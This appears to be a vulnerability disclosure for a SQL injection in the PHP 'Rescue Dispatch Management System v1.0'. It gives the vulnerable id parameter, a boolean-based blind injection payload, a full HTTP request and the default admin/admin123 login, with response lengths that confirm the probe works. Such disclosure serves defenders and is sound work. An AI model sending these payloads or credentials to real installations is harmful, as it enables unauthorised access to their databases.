# Rescue Dispatch Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15296/rescue-dispatch-management-system-phpoop-free-source-code.html

Vulnerability File:  /rdms/admin/teams/manage_team.php?id=

Vulnerability location: /rdms/admin/teams/manage_team.php?id=,id

[+] Payload: /rdms/admin/teams/manage_team.php?id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id

Current database name: rdms_db,length is 7

```sql
GET /rdms/admin/teams/manage_team.php?id=1%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=hkbchcmaitn0d8enhm4jtdjk9q
Connection: close
```

When length (database ()) = 6, Content-Length: 2895
![image](https://user-images.githubusercontent.com/54017627/170461884-602358c7-c42d-4274-b775-d3f741960e65.png)

![image](https://user-images.githubusercontent.com/54017627/170461636-49c57419-e078-48a3-911a-0c0365e0a8e2.png)

When length (database ()) = 7, Content-Length: 2921
![image](https://user-images.githubusercontent.com/54017627/170461850-1d3ef7b3-2155-43a5-9918-07e51328f0b8.png)

![image](https://user-images.githubusercontent.com/54017627/170461601-7e4d569d-71e1-44b3-82eb-e434584f1772.png)
